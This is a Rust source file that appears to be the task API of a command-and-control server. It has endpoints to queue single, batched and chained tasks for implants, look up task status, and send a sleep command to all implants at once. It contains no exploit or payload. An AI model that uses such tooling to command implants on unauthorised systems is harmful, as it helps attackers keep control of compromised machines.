use crate::core::implants::parse_agent_id;
use crate::state::AppState;
use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde::Deserialize;
use serde_json::json;

pub fn routes(state: AppState) -> Router {
    Router::new()
        .route("/api/tasks", post(queue_task))
        .route("/api/tasks/batch", post(batch_tasks))
        .route("/api/tasks/chain", post(chain_tasks))
        .route("/api/tasks/{id}", get(get_task))
        .route("/api/implants/{id}/tasks", get(list_implant_tasks))
        .route("/api/implants/bulk/sleep", post(bulk_sleep))
        .with_state(state)
}

#[derive(Deserialize)]
struct QueueTaskRequest {
    agent_id: String,
    task_type: u8,
    #[serde(default)]
    data: String,
}

async fn queue_task(
    State(state): State<AppState>,
    Json(req): Json<QueueTaskRequest>,
) -> impl IntoResponse {
    let agent_id = match parse_agent_id(&req.agent_id) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };

    let data_bytes = if req.data.is_empty() {
        Vec::new()
    } else {
        req.data.as_bytes().to_vec()
    };

    match state.tasks.enqueue(&agent_id, req.task_type, &data_bytes) {
        Ok(task_id) => (
            StatusCode::CREATED,
            Json(json!({ "task_id": task_id, "status": "pending" })),
        ),
        Err(e) => (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    }
}

async fn get_task(
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> impl IntoResponse {
    match state.tasks.get(id) {
        Ok(Some(task)) => (StatusCode::OK, Json(json!(task))),
        Ok(None) => (StatusCode::NOT_FOUND, Json(json!({ "error": "not found" }))),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e })),
        ),
    }
}

async fn list_implant_tasks(
    State(state): State<AppState>,
    Path(id): Path<String>,
) -> impl IntoResponse {
    let agent_id = match parse_agent_id(&id) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };
    match state.tasks.list_for_implant(&agent_id) {
        Ok(tasks) => (StatusCode::OK, Json(json!({ "tasks": tasks }))),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e })),
        ),
    }
}

#[derive(Deserialize)]
struct BatchTaskRequest {
    agent_id: String,
    tasks: Vec<TaskItem>,
}

#[derive(Deserialize)]
struct TaskItem {
    task_type: u8,
    #[serde(default)]
    data: String,
}

async fn batch_tasks(
    State(state): State<AppState>,
    Json(req): Json<BatchTaskRequest>,
) -> impl IntoResponse {
    let agent_id = match parse_agent_id(&req.agent_id) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };

    let mut task_ids = Vec::new();
    for item in &req.tasks {
        let data = item.data.as_bytes().to_vec();
        match state.tasks.enqueue(&agent_id, item.task_type, &data) {
            Ok(id) => task_ids.push(id),
            Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
        }
    }
    (StatusCode::CREATED, Json(json!({ "task_ids": task_ids })))
}

async fn chain_tasks(
    State(state): State<AppState>,
    Json(req): Json<BatchTaskRequest>,
) -> impl IntoResponse {
    let agent_id = match parse_agent_id(&req.agent_id) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };

    let tasks: Vec<(u8, Vec<u8>)> = req
        .tasks
        .iter()
        .map(|t| (t.task_type, t.data.as_bytes().to_vec()))
        .collect();

    match state.tasks.enqueue_chain(&agent_id, &tasks) {
        Ok((chain_id, task_ids)) => (
            StatusCode::CREATED,
            Json(json!({ "chain_id": chain_id, "task_ids": task_ids })),
        ),
        Err(e) => (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    }
}

#[derive(Deserialize)]
struct BulkSleepRequest {
    #[serde(default)]
    agent_ids: Vec<String>,
    sleep_ms: u32,
}

async fn bulk_sleep(
    State(state): State<AppState>,
    Json(req): Json<BulkSleepRequest>,
) -> impl IntoResponse {
    let data = req.sleep_ms.to_string();
    let data_bytes = data.as_bytes();

    let targets: Vec<[u8; 16]> = if req.agent_ids.is_empty() {
        match state.db.list_implants() {
            Ok(imps) => imps.iter().map(|i| i.agent_id).collect(),
            Err(e) => {
                return (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    Json(json!({ "error": e.to_string() })),
                )
            }
        }
    } else {
        let mut ids = Vec::new();
        for hex_id in &req.agent_ids {
            match parse_agent_id(hex_id) {
                Ok(id) => ids.push(id),
                Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
            }
        }
        ids
    };

    let mut task_ids = Vec::new();
    for agent_id in &targets {
        match state.tasks.enqueue(agent_id, 2, data_bytes) {
            Ok(id) => task_ids.push(id),
            Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
        }
    }
    (
        StatusCode::CREATED,
        Json(json!({ "task_ids": task_ids, "implants_affected": targets.len() })),
    )
}
